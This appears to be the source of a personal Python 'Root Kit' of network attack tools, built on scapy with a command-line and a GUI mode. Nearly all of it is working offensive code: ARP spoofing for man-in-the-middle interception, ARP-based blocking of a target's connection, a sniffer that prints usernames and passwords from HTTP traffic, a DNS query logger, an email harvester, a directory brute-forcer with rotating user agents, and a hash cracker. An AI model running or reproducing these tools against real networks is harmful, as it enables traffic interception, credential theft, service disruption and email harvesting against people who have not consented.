#! /usr/bin/env python3
from alive_progress import alive_bar
import time
from os import system
import termcolor
import re
from collections import deque
import urllib.parse
import requests.exceptions
from bs4 import BeautifulSoup
import argparse
import socket
from tabulate import tabulate
import os
import hashlib
from termcolor import colored
import requests
import string
from itertools import combinations
import threading
import random
import scapy.all as scapy
import eel
from scapy.layers import http


def getNetworkIp():
    ipArr = getRouter(getD=False).split(".")
    ipArr[3] = "1/24"
    ip = ""
    for i in ipArr:
        ip += i+'.'
    return ip[:-1]


@eel.expose
def scan():
    ip = getNetworkIp()
    print(f"[+] Found network ip {ip}")
    s = Scanner(ip, Device)
    print("[+] Scanning...")
    s.scan()
    clients = s.clients
    s = ""
    data = [["IP", "MAC", "NAME"]]
    for x in clients:
        data.append([x.ip, x.mac, getHostName(x.ip)])
    s = tabulate(data, headers="firstrow", tablefmt="fancy_grid")
    print(s)


@eel.expose()
def block(target):
    router = getRouter()
    print(
        colored(f"[+] Starting Network Blocker Attack On {target}", "yellow"))
    blocker = Blocker(router, Device(target))
    blocker.start()


@eel.expose
def mitm(target):
    router = getRouter()
    print(
        colored(f"[+] Starting Man In The Middle Attack On {target}", "yellow"))
    spoofer = ArpSpoofer(Device(target), router)
    spoofer.start()


@eel.expose
def scrape(target):
    print(colored(f"[+] Starting Email Scraper for {target}", "yellow"))
    scraper = EmailScraper(
        target, "/home/ido/rootkit-output/Scraper/emails.txt", 1000, True, False)
    print(colored("[+] CTRL + C To Stop", "yellow"))
    scraper.main()


class DirSearch():
    def __init__(self, base_url) -> None:
        if base_url[-1] == "/":
            self.base = base_url
        else:
            self.base = base_url + "/"
        self.agents = self.getUserAgents()
        data = self.getWordList()
        self.wordlists = self.split(data, 5)
        self.done = False

    def getUserAgents(self) -> list:
        return requests.get("https://raw.githubusercontent.com/maurosoria/dirsearch/master/db/user-agents.txt").text.splitlines()

    def getWordList(self) -> list:
        return requests.get("https://raw.githubusercontent.com/maurosoria/dirsearch/master/db/dicc.txt").text.splitlines()

    def getRandomUserAgent(self):
        field = random.choice(self.agents)
        return {"User-Agent": field}

    def checkRequest(self, url: str):
        x = requests.get(self.base+url, headers=self.getRandomUserAgent())
        if x.status_code == 200:
            print(colored(f"[+] {x.url}", "green", attrs=["bold"]))

    def split(self, a: list, n: int):
        k, m = divmod(len(a), n)
        return (a[i * k + min(i, m):(i + 1) * k + min(i + 1, m)] for i in range(n))

    def run(self, wordlist):
        for path in wordlist:
            self.checkRequest(path)
        self.done = True

    def start(self):
        for wordlist in self.wordlists:
            t = threading.Thread(target=self.run, args=[wordlist, ])
            t.daemon = True
            t.start()
        print(colored("[+] Running 5 Threads...", "yellow", attrs=["bold"]))
        while not self.done:
            pass

class PasswordSniffer():
    def __init__(self) -> None:
        self.keys = ['uname', 'usr', 'name', 'username', 'password', 'passwd']

    def filter(self, packet:scapy.Packet):
        return packet.haslayer(http.HTTPRequest) and packet.haslayer(scapy.Raw)

    def todo(self, packet:scapy.Packet):
        print(f'[+] HTTP Request <{packet[http.HTTPRequest].Host.decode()}{packet[http.HTTPRequest].Path.decode()}>')
        load = packet[scapy.Raw].load
        for key in self.keys:
            if key in load.decode():
                print(colored("[+] Found! >> ", 'green',
                attrs=['bold']) +load.decode())

    def stopFilter(self, packet:scapy.Packet):
        try:
            while True:
                pass
        except KeyboardInterrupt:
            return True

    def start(self):
        scapy.sniff(lfilter=self.filter, prn=self.todo, stop_filter=self.stopFilter)  
        os.system("clear")
        print(colored("[-] Closed.", 'red', attrs=['bold']))
        exit(0)

class Cracker():
    def __init__(self, h, wordlist) -> None:
        if len(h) == 32:
            self.activate = hashlib.md5
        else:
            self.activate = hashlib.sha256
        self.hash = h
        with open(wordlist, "rb") as f:
            data = f.read().splitlines()
            f.close()
        self.wordlists = self.split(data, 5)
        self.found = False
        self.done = False

    def compare(self, wl: list):
        for word in wl:
            h = self.activate(word).hexdigest()
            if h == self.hash:
                print(colored(f"[+] Found >> {word}", "green"))
                self.found = True
        self.done = True

    def runThreads(self):
        for wordlist in self.wordlists:
            t = threading.Thread(target=self.compare, args=[wordlist, ])
            t.daemon = True
            t.start()

    def split(self, a: list, n: int):
        k, m = divmod(len(a), n)
        return (a[i * k + min(i, m):(i + 1) * k + min(i + 1, m)] for i in range(n))

    def onlineDBCheck(self):
        x = requests.get(f"https://www.nitrxgen.net/md5db/{self.hash}").text
        return x if x != "" else -1

    def genWord(self, chars, max_length=12):
        for length in range(1, max_length + 1):
            for word in map(''.join, combinations(chars, length)):
                yield word

    def bruteForce(self, chars: list):
        for word in self.genWord(chars, max_length=12):
            if self.hash == self.activate(word.encode()).hexdigest():
                print(colored(f"Found >> {word}", "green", attrs=["bold"]))
                self.found = True

    def start(self):
        print(colored("[+] Checking Online...", "yellow"))
        if self.activate == hashlib.md5:
            x = self.onlineDBCheck()
            if x == -1:
                print(colored("[-] Online DB LookUp Gave Nothing.",
                              "red", attrs=["bold"]))
            else:
                print(x)
                return
        print(colored("[+] Running Wordlist Check...", "yellow"))
        self.runThreads()
        while not self.done:
            if self.found:
                return
        print(colored("[-] No Matches On The List...", "red", attrs=["bold"]))
        print(colored("[+] Running Brute Force...", "yellow"))
        letters = []
        for x in string.ascii_letters:
            letters.append(x)
        for x in string.digits:
            letters.append(x)
        t = threading.Thread(target=self.bruteForce(letters))
        t.daemon = True
        t.start()
        while not self.found:
            pass
        exit(0)

class EmailScraper():
    def __init__(self, url: str, filename: str, count: int, verbose: bool, check: bool) -> None:
        self.url = url
        self.filename = filename
        self.count = count
        self.verbose = verbose
        self.check = check
        self.urls = deque([url])
        self.scraped_urls = set()
        self.emails = set()
        self.regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'

    def get_TLDS(self):
        with open("src/EmailScraper/emailTLDS.txt", "r") as file:
            tlds = file.readlines()
            file.close()
        return tlds

    def main(self):
        print(termcolor.colored("[!] Running...", "green"))
        try:
            if self.check:
                tlds = self.get_TLDS()
            count = 0
            with alive_bar() as bar:
                while len(self.urls):
                    count += 1
                    if count == self.count:
                        break
                    url = self.urls.popleft()
                    self.scraped_urls.add(url)

                    parts = urllib.parse.urlsplit(url)
                    base_url = '{0.scheme}://{0.netloc}'.format(parts)

                    path = url[:url.rfind(
                        '/') + 1] if '/' in parts.path else url
                    try:
                        response = requests.get(url)
                        if response.status_code == 404:
                            print(f"The URL {url} is not valid.")
                    except (
                            requests.exceptions.MissingSchema, requests.exceptions.ConnectionError,
                            requests.exceptions.InvalidSchema):
                        continue
                    new_emails = set(re.findall(
                        self.regex, response.text, re.I))
                    if self.check:
                        new_real_emails = []
                        for e in new_emails:
                            for tld in tlds:
                                tld = tld.strip().replace(" ", "").lower()
                                if str(e).endswith(tld) and not str(e).endswith("jpg") and not str(e).endswith("png"):
                                    new_real_emails.append(e)
                                    break
                        new_emails = set(new_real_emails)
                    self.emails.update(new_emails)

                    soup = BeautifulSoup(response.text, features="lxml")

                    for anchor in soup.find_all("a"):
                        link = anchor.attrs['href'] if 'href' in anchor.attrs else ''
                        if link.startswith('/'):
                            link = base_url + link
                        elif link.startswith('http'):
                            link = link
                        elif "php" in link or "html" in link:
                            link = base_url + "/"+link
                        if not link in self.urls and not link in self.scraped_urls:
                            self.urls.append(link)
                    bar()
        except KeyboardInterrupt:
            print(termcolor.colored('[!] Closing...', 'red'))
        print("100.0%")
        time.sleep(0.2)
        system("clear")
        print(f"[*] {len(self.emails)} Emails found.")
        if self.filename:
            file = open(self.filename, 'w')
            for mail in self.emails:
                if self.verbose:
                    print(mail)
                file.write(mail+"\n")
            file.close()
        else:
            for mail in self.emails:
                print(termcolor.colored(mail, 'blue'))

        if self.filename:
            print(termcolor.colored("[!] Done!", "green"))
            print(termcolor.colored(f"[!] Saved to {self.filename}", "green"))
            print(termcolor.colored("[!] Closed.", 'red'))
        else:
            input("Enter to clear and close >> ")
            system("cls")
            print(termcolor.colored("[!] Done!", "green"))
            print(termcolor.colored("[!] Closed.", 'red'))


class Blocker():
    def __init__(self, router, target) -> None:
        self.target = target
        self.router = router
        self.stop = False

    def spoof(self):
        packet = scapy.ARP(pdst=self.target.ip,
                           hwdst=self.target.mac, psrc=self.router.ip, op=2)
        while not self.stop:
            scapy.send(packet, verbose=False)

    def start(self):
        t = threading.Thread(target=self.spoof)
        t.daemon = True
        t.start()
        print(f"\n[+] Started for {self.target}\n")
        input("[+] Enter To Stop >> ")
        self.stop = True


class Device():
    mac: str
    ip: str

    def __init__(self, ip, mac="") -> None:
        self.ip = ip
        self.mac = self.setMac() if mac != "" else mac

    def setMac(self):
        packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=self.ip)
        ans = scapy.srp(packet, timeout=2, verbose=False)[0]
        try:
            return ans[0][1].hwsrc
        except:
            return ""

    def __str__(self) -> str:
        return f"{self.ip} <-> {self.mac}"


class Scanner():
    ip: str
    clients: list

    def __init__(self, ip, Device) -> None:
        self.ip = ip
        self.clients = []
        self.Device = Device

    def scan(self):
        packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=self.ip)
        answered = scapy.srp(packet, timeout=2, verbose=False)[0]

        for element in answered:
            client = self.Device(element[1].psrc, element[1].hwsrc)
            self.clients.append(client)

        time.sleep(2)
        print(f"[+] Found {len(self.clients)} clients!")


class ArpSpoofer():
    def __init__(self, target, router) -> None:
        self.target = target
        self.router = router
        self.stop = False

    def spoof(self):
        p1 = scapy.ARP(pdst=self.target.ip,
                       hwdst=self.target.mac, psrc=self.router.ip)
        p2 = scapy.ARP(pdst=self.router.ip,
                       hwdst=self.router.mac, psrc=self.target.ip)

        while not self.stop:
            scapy.send(p1, verbose=False)
            scapy.send(p2, verbose=False)

    def start(self):
        t = threading.Thread(target=self.spoof)
        t.daemon = True
        t.start()
        print(f"[+] Running for {self.target.ip}.")
        input("[+] Enter To Stop >> ")
        self.stop = True


class Logger():
    def __filter(self, packet):
        return scapy.DNSQR in packet

    def __todo(self, packet):
        site = packet[scapy.DNSQR].qname.decode()
        if '.com' or '.org' or 'www' or (not 'local') in site:
            print(site)

    def start(self):
        scapy.sniff(lfilter=self.__filter, prn=self.__todo)


def clearScreen():
    os.system("clear")


def getHostName(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except:
        return colored("Unknown", "red", attrs=['bold'])


def isSudo():
    return os.getuid() == 0


def getRouter(getD=True):
    raw = os.popen("ip route | grep default").read()
    arr = raw.split(" ")
    if not getD:
        x = arr[2]
    else:
        x = Device(arr[2])
    return x


def getArgs():
    parser = argparse.ArgumentParser(description="GodZilo's Work Tools.")
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--scan", dest="scan",
                        help="Specify the target network you want to scan!")
    parser.add_argument("-b", "--block", dest="block",
                        help="Specify the target IP you want to block!")
    parser.add_argument("-m", "--mitm", dest="mitm",
                        help="Specify the target IP you want to attack!")
    parser.add_argument("-e", "--scrape-emails", dest="scrape",
                        help="Specify the target URL you want to scan!")
    parser.add_argument("-p", "--path-scanner", dest="path",
                        help="Specify the target URL you want to scan!")
    parser.add_argument("-c", "--crack", dest="crack",
                        help="Specify the [MD5 / SHA256] hash you want to crack!")
    parser.add_argument("-ps", "--password-snifer", dest="ps", action="store_true",
                        help="Specify If You Want To Use Password Sniffer!")
    parser.add_argument("-l", "--web-logger", dest="logger", action="store_true",
                        help="Specify If You Want To Use Web Logger!")
    parser.add_argument("-g", "--gui", dest="gui", action="store_true",
                        help="Specify If You Want To Use The GUI Version!")
    opt = parser.parse_args()
    if opt.gui:
        return "gui"
    elif opt.scan and not (opt.scrape or opt.block or opt.mitm or opt.path or opt.crack or opt.logger or opt.ps):
        return "scan", opt.scan
    elif opt.block and not (opt.scrape or opt.scan or opt.mitm or opt.path or opt.crack or opt.logger or opt.ps):
        return "block", opt.block
    elif opt.mitm and not (opt.scrape or opt.block or opt.scan or opt.path or opt.crack or opt.logger or opt.ps):
        return "mitm", opt.mitm
    elif opt.scrape and not (opt.scan or opt.block or opt.mitm or opt.path or opt.crack or opt.logger or opt.ps):
        return "scrape", opt.scrape
    elif opt.path and not (opt.scan or opt.block or opt.mitm or opt.scrape or opt.crack or opt.logger or opt.ps):
        return "pathscanner", opt.path
    elif opt.crack and not (opt.scan or opt.block or opt.mitm or opt.scrape or opt.path or opt.logger or opt.ps):
        return "crack", opt.crack
    elif opt.logger and not (opt.scan or opt.block or opt.mitm or opt.scrape or opt.path or opt.crack or opt.ps):
        return "logger", opt.logger
    elif opt.ps and not (opt.scan or opt.block or opt.mitm or opt.scrape or opt.path or opt.crack):
        return "sniff", opt.ps
    else:
        if opt.scrape or opt.block or opt.mitm or opt.scan:
            print(colored("\t[!] You Can Only Use One Flag At A Time.", "red"))
        print("[!] Use -h")
        exit(-1)


def printLOGO(cmd):
    print("""
  ____           _      _
 / ___| ___   __| |__  (_) | ___
| |  _ / _ \ / _` | / /| | |/ _ \.
| |_| | (_) | (_| |/ /_| | | (_) |
 \____|\___/ \__,_/____|_|_|\___/
  """)
    print("\n****************************************************************")
    print(colored("\n* Copyright of Ido Barel, 2022                         ",
          "red", attrs=["bold"]))
    print(colored("\n* Root Kit                                             ",
          "green", attrs=["bold"]))
    print("")
    print(colored(f"* Just Some Nice Hacking Tools | {cmd}.                 ",
          "cyan", attrs=["bold"]))
    print("\n****************************************************************")
    print("\n\n")


def main():
    if not isSudo():
        print(colored("[-] Run As Sudo.", "red"))
        exit(-1)
    router = getRouter()
    command, target = getArgs()
    clearScreen()
    printLOGO(command)
    if command == 'scan':
        s = Scanner(target, Device)
        s.scan()
        data = [["IP", "MAC", "NAME"]]
        for x in s.clients:
            name = getHostName(x.ip)
            data.append([x.ip, x.mac, name])
        print(tabulate(data, headers="firstrow", tablefmt="fancy_grid"))
    elif command == 'block':
        print(
            colored(f"[+] Starting Network Blocker Attack On {target}", "yellow"))
        blocker = Blocker(router, Device(target))
        blocker.start()
    elif command == 'mitm':
        print(
            colored(f"[+] Starting Man In The Middle Attack On {target}", "yellow"))
        spoofer = ArpSpoofer(Device(target), router)
        spoofer.start()
    elif command == 'scrape':
        print(colored(f"[+] Starting Email Scraper for {target}", "yellow"))
        scraper = EmailScraper(
            target, "/home/ido/rootkit-output/Scraper/emails.txt", 1000, False, False)
        print(colored("[+] CTRL + C To Stop", "yellow"))
        scraper.main()
    elif command == 'pathscanner':
        print(
            colored(f"[+] Starting Path Scanning On {target} .", "yellow"))
        finder = DirSearch(target)
        try:
            finder.start()
        except KeyboardInterrupt:
            print(colored("[+] Action Stopped By The User.",
                  "red", attrs=["bold"]))
            exit(0)
    elif command == 'crack':
        wordlist = input("[+] Word List Path >> ")
        print(
            colored(f"[+] Starting Hash Cracking On {target} .", "yellow"))
        cracker = Cracker(target, wordlist)
        try:
            cracker.start()
        except KeyboardInterrupt:
            print(colored("[+] Action Stopped By The User.",
                  "red", attrs=["bold"]))
            exit(0)
    elif command == 'logger':
        print(
            colored(f"[+] Starting Web Logger.\n", "yellow"))
        logger = Logger()
        try:
            logger.start()
        except KeyboardInterrupt:
            print(colored("[+] Action Stopped By The User.",
                  "red", attrs=["bold"]))
            exit(0)
    elif command == 'sniff':
        print(colored("[+] Starting Password Sniffer.\n", "yellow"))
        s = PasswordSniffer()
        s.start()


if __name__ == "__main__":
    if getArgs() == "gui":
        print(colored("[+] Running GUI Application.", "green", attrs=["bold"]))
        eel.init('/usr/local/bin/www')
        eel.start("index.html", size=(1224, 600), position=(300, 200))
    else:
        main()
